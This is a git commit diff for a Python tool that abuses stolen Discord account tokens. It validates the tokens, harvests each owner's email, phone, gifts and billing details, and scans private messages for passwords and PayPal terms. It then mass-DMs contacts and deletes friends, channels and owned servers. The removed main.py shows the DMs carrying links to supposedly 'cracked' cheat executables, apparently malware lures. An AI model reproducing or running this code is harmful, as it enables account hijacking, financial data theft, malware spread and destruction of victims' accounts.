47b90d9b440c8c777a5f7105b8ad77c973fdd489
NMan1 <nickmantini01@gmail.com>
2020-12-16 10:56:01 -0600

    Commit

---
+++ api.py
@@ -0,0 +1,356 @@
+import json
+import random
+import time
+
+import requests
+
+CEND = '\33[0m'
+CRED = '\33[31m'
+CGREEN = '\33[32m'
+
+
+class Api:
+    def __init__(self, token, VALIDATE):
+        self.token = token
+        self.username = "None"
+        self.id = "None"
+        self.email = "None"
+        self.phone = "None"
+        self.has_nitro = False
+        self.gifts = []
+        self.payments = []
+        self.game_pass = ""
+        self.valid = False
+
+        if VALIDATE:
+            self.validate()
+        else:
+            self.load_json()
+            self.valid = True
+
+    def validate(self):
+        url = f"https://discord.com/api/v8/users/@me"
+        headers = {"authorization": self.token,
+                   "accept": "/",
+                   "authority": "discordapp.com",
+                   "content-type": "application/json",
+                   }
+        r = requests.get(url, headers=headers)
+        if r.status_code == 200:
+            data = r.json()
+            self.username = data['username'] + "#" + data['discriminator']
+            self.id = data['id']
+            self.email = data['email']
+            self.phone = data['phone']
+            self.has_nitro = self.get_nitro()
+            self.gifts = self.get_gifts()
+            self.game_pass = self.get_game_pass()
+            self.get_payments()
+
+            print(CGREEN + f"{self.username} Valid" + CEND)
+
+            self.valid = True
+            return True
+        else:
+            self.valid = False
+            return False
+
+    def get_profile(self):
+        url = f"https://discord.com/api/v8/users/{self.id}/profile"
+        headers = {"authorization": self.token,
+                   "accept": "/",
+                   "authority": "discordapp.com",
+                   "content-type": "application/json",
+                   }
+        r = requests.get(url, headers=headers)
+        if r.status_code == 200:
+            print(f"Account name: {r.json()['user']['username']}")
+            return True
+        else:
+            print(CRED + f"[Error] in [{self.get_profile.__name__}] {r.status_code}" + CEND)
+            return False
+
+    def get_gifts(self):
+        url = f"https://discord.com/api/v8/users/@me/entitlements/gifts"
+        headers = {"authorization": self.token,
+                   "accept": "/",
+                   "authority": "discordapp.com",
+                   "content-type": "application/json",
+                   }
+        r = requests.get(url, headers=headers)
+        try:
+            if dict(r.json())['code'] == 40002:
+                return []
+        except Exception:
+            pass
+        return r.json()
+
+    def get_game_pass(self):
+        url = f"https://discord.com/api/v8/promotions/xbox-game-pass"
+        headers = {"authorization": self.token,
+                   "accept": "/",
+                   "authority": "discord.com",
+                   }
+        r = requests.get(url, headers=headers)
+
+        if r.json()['code'] == 40002:
+            return 0
+
+        return r.json()['code']
+
+    def get_nitro(self):
+        url = f"https://discord.com/api/v8/users/{self.id}/profile"
+        headers = {"authorization": self.token,
+                   "accept": "/",
+                   "authority": "discordapp.com",
+                   "content-type": "application/json",
+                   }
+        r = requests.get(url, headers=headers)
+
+        try:
+            return bool(r.json()['premium_since'])
+        except Exception:
+            return False
+
+    def get_payments(self):
+        payment_types = ["Credit Card", "Paypal"]
+        url = "https://discord.com/api/v8/users/@me/billing/payment-sources"
+        headers = {"authorization": self.token,
+                   "accept": "/",
+                   "authority": "discord.com",
+                   "content-type": "application/json",
+                   }
+        time.sleep(.5)
+        r = requests.get(url, headers=headers)
+        if r.status_code == 200:
+            dataa = r.json()
+
+            try:
+                for data in dataa:
+                    if int(data['type'] == 1):
+                        self.payments.append({'type': payment_types[int(data['type']) - 1],
+                                              'valid': not data['invalid'],
+                                              'brand': data['brand'],
+                                              'last 4': data['last_4'],
+                                              'expires': str(data['expires_year']) + "y " + str(
+                                                  data['expires_month']) + 'm',
+                                              'billing name': data['billing_address']['name'],
+                                              'country': data['billing_address']['country'],
+                                              'state': data['billing_address']['state'],
+                                              'city': data['billing_address']['city'],
+                                              'zip code': data['billing_address']['postal_code'],
+                                              'address': data['billing_address']['line_1'], })
+                    else:
+                        self.payments.append({'type': payment_types[int(data['type']) - 1],
+                                              'valid': not data['invalid'],
+                                              'email': data['email'], 'billing name': data['billing_address']['name'],
+                                              'country': data['billing_address']['country'],
+                                              'state': data['billing_address']['state'],
+                                              'city': data['billing_address']['city'],
+                                              'zip code': data['billing_address']['postal_code'],
+                                              'address': data['billing_address']['line_1'], })
+            except Exception as e:
+                print(f"Exception payment {e}")
+            return True
+        else:
+            if r.status_code == 403:
+                pass # verify account
+            else:
+                print(CRED + f"[Error] in [{self.get_payments.__name__}] {r.status_code}" + CEND)
+            return False
+
+    def get_user_channels(self):
+        url = f"https://discordapp.com/api/users/@me/channels"
+        headers = {"authorization": self.token,
+                   "accept": "/",
+                   "authority": "discordapp.com",
+                   "content-type": "application/json",
+                   }
+        r = requests.get(url, headers=headers)
+        if r.status_code == 200:
+            return r.json()
+        elif r.status_code == 403:
+            return {}
+        else:
+            print(CRED + f"[Error] in [{self.get_user_channels.__name__}] {r.status_code}" + CEND)
+            return {}
+
+    def get_guilds(self):
+        url = "https://discord.com/api/v8/users/@me/guilds"
+        headers = {"authorization": self.token,
+                   "accept": "/",
+                   "authority": "discordapp.com",
+                   "content-type": "application/json",
+                   }
+        r = requests.get(url, headers=headers)
+        if r.status_code == 200:
+            return r.json()
+        else:
+            print(CRED + f"[Error] in [{self.get_guilds.__name__}] {r.status_code}" + CEND)
+            return {}
+
+    def get_friends(self):
+        url = "https://discord.com/api/v8/users/@me/relationships"
+        headers = {"authorization": self.token,
+                   "accept": "/",
+                   "authority": "discordapp.com",
+                   "content-type": "application/json",
+                   }
+        r = requests.get(url, headers=headers)
+        if r.status_code == 200:
+            return r.json()
+        else:
+            print(CRED + f"[Error] in [{self.get_friends.__name__}] {r.status_code}" + CEND)
+            return {}
+
+    def get_messages(self, terms):
+        with open(f"msgs//{self.username}-msgs", "w", encoding="utf-8") as file:
+            for index, channel in enumerate(self.get_user_channels()):
+                try:
+                    url = f"https://discord.com/api/v8/channels/{channel['id']}/messages?limit=100"
+                    headers = {"authorization": self.token,
+                               "accept": "/",
+                               "authority": "discordapp.com",
+                               "content-type": "application/json",
+                               }
+                    r = requests.get(url, headers=headers)
+                    if r.status_code == 200:
+                        for msg in r.json():
+                            if any(word in msg['content'].lower() for word in terms):
+                                if msg['author']['username'] in ["MEE6", "Dyno", "AltDentifier"]:
+                                    continue
+                                file.write(f"By {msg['author']['username'] + '#' + msg['author']['discriminator']} | {msg['channel_id']} Found term.\n{msg['content']}"+"\n\n")
+                    else:
+                        print(CRED + f"[Error] in [{self.get_messages.__name__}] {r.status_code}" + CEND)
+                        return False
+                except Exception:
+                    pass
+        print(f"[Finished] Dumping messages for {self.username}")
+
+    def send_message(self, msg, channel_id):
+        url = f"https://discord.com/api/v8/channels/{channel_id}/messages"
+        headers = {"authorization": self.token,
+                   "accept": "/",
+                   "authority": "discordapp.com",
+                   "content-type": "application/json",
+                   }
+        data = {"content": msg}
+        r = requests.post(url, headers=headers, json=data)
+
+    def send_mass_dms(self, message_list):
+        total = 0
+        for index, channel in enumerate(self.get_user_channels()):
+            self.send_message(random.choice(message_list), channel['id'])
+            total += 1
+            time.sleep(1)
+        print(f"{self.username} | Sent {total} dm's")
+
+    def set_typing(self):
+        url = f"https://discord.com/api/v8/channels/765669565874176010/typing"
+        headers = {"authorization": self.token,
+                   "accept": "/",
+                   "authority": "discordapp.com",
+                   "content-length": "0"
+                   }
+        r = requests.post(url, headers=headers, json={})
+        print(f"Sent typing request: {r.status_code}" + CEND)
+
+    def delete_friends(self):
+        total = 0
+        for index, friend in enumerate(self.get_friends()):
+            url = f"https://discord.com/api/v8/users/@me/relationships/{friend['id']}"
+            headers = {"authorization": self.token,
+                       "accept": "/",
+                       "authority": "discordapp.com",
+                       "content-type": "application/json",
+                       }
+            r = requests.delete(url, headers=headers)
+            if r.status_code == 200 or r.status_code == 204:
+                total += 1
+            else:
+                print(CRED + f"[Error] in [{self.delete_friends.__name__}] {r.status_code}" + CEND)
+            # time.sleep(1)
+        print(f"{self.username} | Deleted {total} friends")
+
+
+    def leave_guilds(self):
+        total = 0
+        for guild in self.get_guilds():
+            if guild['owner']:
+                url = f"https://discord.com/api/v8/guilds/{guild['id']}/delete"
+                headers = {"authorization": self.token,
+                           "accept": "/",
+                           "authority": "discord.com",
+                           "content-type": "application/json",
+                           }
+                r = requests.post(url, headers=headers, json={})
+                if r.status_code == 204 or r.status_code == 200:
+                    total += 1
+            else:
+                url = f"https://discord.com/api/v8/users/@me/guilds/{guild['id']}"
+                headers = {"authorization": self.token,
+                           "accept": "/",
+                           "authority": "discord.com",
+                           "content-type": "application/json",
+                           }
+                r = requests.delete(url, headers=headers, json={})
+        print(f"{self.username} | Deleted {total} guilds")
+
+    def delete_channels(self):
+        total = 0
+        for index, channel in enumerate(self.get_user_channels()):
+            url = f"https://discord.com/api/v8/channels/{channel['id']}"
+            headers = {"authorization": self.token,
+                       "accept": "/",
+                       "authority": "discordapp.com",
+                       "content-type": "application/json",
+                       }
+            r = requests.delete(url, headers=headers)
+            if r.status_code == 200:
+                total += 1
+            # time.sleep(1)
+        print(f"{self.username} | Deleted {total} channels")
+
+
+    def get_friends_with_nitro(self):
+        friends = []
+        for friend in self.get_friends():
+            url = f"https://discord.com/api/v8/users/{friend['id']}/profile"
+            headers = {"authorization": self.token,
+                       "accept": "/",
+                       "authority": "discordapp.com",
+                       "content-type": "application/json",
+                       }
+            r = requests.get(url, headers=headers)
+
+            try:
+                if bool(r.json()['premium_since']):
+                    friends.append(friend['user']['username']+friend['user']['discriminator'])
+            except Exception:
+                pass
+        return friends
+
+    def search(self):
+        terms = ['password', 'pass', 'login', 'paypal', 'email', 'gift', 'nitro', 'account', "@", "gmail"]
+        print(f"\nSearching messages in {self.username} with terms: {terms}")
+        self.get_messages(terms)
+
+
+    def load_json(self):
+        with open("accounts.json", "r+") as file:
+            loaded_accounts = json.load(file)
+            self.username = loaded_accounts[self.token]['username']
+            self.id = loaded_accounts[self.token]['id']
+            self.email = loaded_accounts[self.token]['email']
+            self.phone = loaded_accounts[self.token]['phone']
+            self.has_nitro = loaded_accounts[self.token]['nitro']
+            self.gifts = loaded_accounts[self.token]['gifts']
+            self.game_pass = loaded_accounts[self.token]['game_pass']
+            self.payments = loaded_accounts[self.token]['payments']
+
+    def dump_json(self):
+        json = {"username": self.username, "id": self.id, "email": self.email,
+                "phone": self.phone, "nitro": self.has_nitro, "gifts": self.gifts,
+                "game_pass": self.game_pass, "payments": self.payments
+                }
+        return json
--- main.py
+++ main.py
@@ -1,244 +1,34 @@
-import os
-import random
-import time
-import requests
+from api import Api
 import json
 
-channels = {"general": 765669565874176010}
-accounts = {}
 
-
-def set_typing(token):
-    url = f"https://discord.com/api/v8/channels/765669565874176010/typing"
-    headers = {"authorization": token,
-               "accept": "/",
-               "authority": "discordapp.com",
-               "content-length": "0"
-               }
-    r = requests.post(url, headers=headers, json={})
-    print(f"Sent typing request: {r.status_code}")
-
-
-def send_message(msg, channel_id, token):
-    url = f"https://discord.com/api/v8/channels/{channel_id}/messages"
-    headers = {"authorization": token,
-               "accept": "/",
-               "authority": "discordapp.com",
-               "content-type": "application/json",
-               }
-    data = {"content": msg}
-    r = requests.post(url, headers=headers, json=data)
-    if r.status_code == 200:
-        print(f"Sent message.")
-    else:
-        print(f"Error on send message: {r.status_code}\n")
-
-
-def get_profile(id, token):
-    url = f"https://discord.com/api/v8/users/{id}/profile"
-    headers = {"authorization": token,
-               "accept": "/",
-               "authority": "discordapp.com",
-               "content-type": "application/json",
-               }
-    r = requests.get(url, headers=headers)
-    if r.status_code == 200:
-        print(f"Account name: {r.json()['user']['username']}")
-        return True
-    else:
-        print(f"Token, {token} Invalid. {r.status_code}")
-        return False
-
-
-def get_payment_info(token):
-    payment_types = ["Credit Card", "Paypal"]
-    url = "https://discord.com/api/v8/users/@me/billing/payment-sources"
-    headers = {"authorization": token,
-               "accept": "/",
-               "authority": "discordapp.com",
-               "content-type": "application/json",
-               }
-    r = requests.get(url, headers=headers)
-    if r.status_code == 200:
-        data = r.json()
-        try:
-            data = data[0]
-            accounts[token]['payment'] = {'type': payment_types[int(data['type']) - 1], 'valid': not data['invalid'],
-                                          'email': data['email'], 'billing name': data['billing_address']['name'],
-                                          'country': data['billing_address']['country'],
-                                          'state': data['billing_address']['state'],
-                                          'city': data['billing_address']['city'],
-                                          'zip code': data['billing_address']['postal_code'],
-                                          'address': data['billing_address']['line_1'], }
-        except Exception:
-            pass
-        return True
-    else:
-        print(f"Invalid (payment) {token} {r.status_code}")
-        return False
-
-
-def validate_token(token):
-    global accounts
-    url = f"https://discord.com/api/v8/users/@me"
-    headers = {"authorization": token,
-               "accept": "/",
-               "authority": "discordapp.com",
-               "content-type": "application/json",
-               }
-    r = requests.get(url, headers=headers)
-    if r.status_code == 200:
-        data = r.json()
-        accounts[token] = {'username': data['username'] + "#" + data['discriminator'], 'id': data['id'],
-                           'email': data['email'], 'phone': data['phone']}
-        print(f"{accounts[token]['username']} | Valid {token}")
-        return True
-    else:
-        print(f"Invalid {token} {r.status_code}")
-        return False
-
-
-def get_channels(token):
-    url = f"https://discordapp.com/api/users/@me/channels"
-    headers = {"authorization": token,
-               "accept": "/",
-               "authority": "discordapp.com",
-               "content-type": "application/json",
-               }
-    r = requests.get(url, headers=headers)
-    if r.status_code == 200:
-        return r.json()
-    else:
-        print(f"Get channels error: {r.status_code}")
-        return False
-
-
-def find_messages(token, terms):
-    for index, channel in enumerate(get_channels(token)):
-        url = f"https://discord.com/api/v8/channels/{channel['id']}/messages?limit=100"
-        headers = {"authorization": token,
-                   "accept": "/",
-                   "authority": "discordapp.com",
-                   "content-type": "application/json",
-                   }
-        r = requests.get(url, headers=headers)
-        if r.status_code == 200:
-            for msg in r.json():
-                if any(word in msg['content'].lower() for word in terms):
-                    print(f"({msg['author']['username']+'#'+msg['author']['discriminator']}) ({msg['channel_id']}) Found term.\nMSG: {msg['content']}\n")
-        else:
-            print(f"Get channels error: {r.status_code}")
-            return False
-
-
-def get_ip():
-    session = requests.Session()
-    r = session.get('https://ifconfig.co/json')
-    data = f'IP: {r.json()["ip"]} - Country: {r.json()["country"]}, {r.json()["city"]}'
-    return data
-
-
-def send_mass_dms(token):
-    msgs = ['if your looking for a r6 cheat Mango Cheats just got cracked https://cdn.discordapp.com/attachments/755205918081286277/771125589973008414/mango_cheats_cracked_2.9.exe',
-            'if your looking for a r6 cheat Alnexcheats just got cracked https://cdn.discordapp.com/attachments/755205918081286277/771125777239900200/Alnexcheats_cheats_cracked-4.2.exe']
-    for index, channel in enumerate(get_channels(token)):
-        send_message(random.choice(msgs),
-                     channel['id'],
-                     token)
-        try:
-            print(f"To {channel['recipients'][0]['username']} #{index}\n")
-        except Exception:
-            pass
-        time.sleep(1)
-
-
-def get_all_friends(token):
-    url = "https://discord.com/api/v8/users/@me/relationships"
-    headers = {"authorization": token,
-               "accept": "/",
-               "authority": "discordapp.com",
-               "content-type": "application/json",
-               }
-    r = requests.get(url, headers=headers)
-    if r.status_code == 200:
-        return r.json()
-    else:
-        print(f"Get all friends error: {r.status_code}")
-        return False
-
-
-def delete_friends(token):
-    for index, friend in enumerate(get_all_friends(token)):
-        url = f"https://discord.com/api/v8/users/@me/relationships/{friend['id']}"
-        headers = {"authorization": token,
-                   "accept": "/",
-                   "authority": "discordapp.com",
-                   "content-type": "application/json",
-                   }
-        r = requests.delete(url, headers=headers)
-        if r.status_code == 200:
-            print(f"Deleted friend {friend['id']}")
-        else:
-            print(f"Delete friends error: {r.status_code}")
-        # time.sleep(1)
-
-
-def delete_channels(token):
-    for index, channel in enumerate(get_channels(token)):
-        url = f"https://discord.com/api/v8/channels/{channel['id']}"
-        headers = {"authorization": token,
-                   "accept": "/",
-                   "authority": "discordapp.com",
-                   "content-type": "application/json",
-                   }
-        r = requests.delete(url, headers=headers)
-        if r.status_code == 200:
-            print(f"Deleted channel {channel['id']}")
-        else:
-            print(f"Delete friends error: {r.status_code}")
-        # time.sleep(1)
-
-
-def validate_all():
-    global accounts
-    for account in dict(accounts):
-        if not validate_token(account):
-            accounts.pop(account, None)
-
-    if os.path.getsize("tokens.txt") > 0:
-        with open("tokens.txt", "r+") as file:
-            lines = file.readlines()
-            file.seek(0)
-
-            for line in lines:
-                if len(line) <= 1:
-                    continue
-
-                if line.strip() in list(accounts.keys()):
-                    continue
-
-                if validate_token(line.strip()):
-                    file.write(line)
-
-                get_payment_info(line.strip())
-            file.truncate()
-
-        with open('accounts.json', 'w') as file:
-            json.dump(accounts, file, indent=4)
+accounts = []
+CEND = '\33[0m'
+CRED = '\33[31m'
+CGREEN = '\33[32m'
 
 
 if __name__ == '__main__':
+    VALIDATE = True
+    tokens = []
     with open('accounts.json') as file:
-        accounts = json.load(file)
+        accounts_file = json.load(file)
+        for token in list(accounts_file.keys()):
+            tokens.append(token)
 
-    validate_all()
+    with open("tokens.txt", "r+") as file:
+        for line in file:
+            if line not in list(tokens) and len(line) > 0:
+                tokens.append(line.strip())
+        file.truncate(0)
 
-    # for token in list(accounts.keys()):
-        # terms = ['password', 'pass', 'login', 'paypal', 'email', 'gift', 'nitro', 'payment', 'money', 'code', 'download', 'link', 'usd', 'account']
-        # print(f"\nSearching messages in {accounts[token]['username']} with terms: {terms}")
-        # find_messages(token, terms)
+    json_accounts = {}
+    for token in tokens:
+        account = Api(token, VALIDATE)
+        if account.valid:
+            accounts.append(account)
+            json_accounts[account.token] = account.dump_json()
 
-    for token in list(accounts.keys()):
-        send_mass_dms(token)
-        delete_channels(token)
-        delete_friends(token)
+    with open('accounts.json', 'w') as file:
+        json.dump(json_accounts, file, indent=4)
+        print(CGREEN + "Dumped accounts" + CEND)
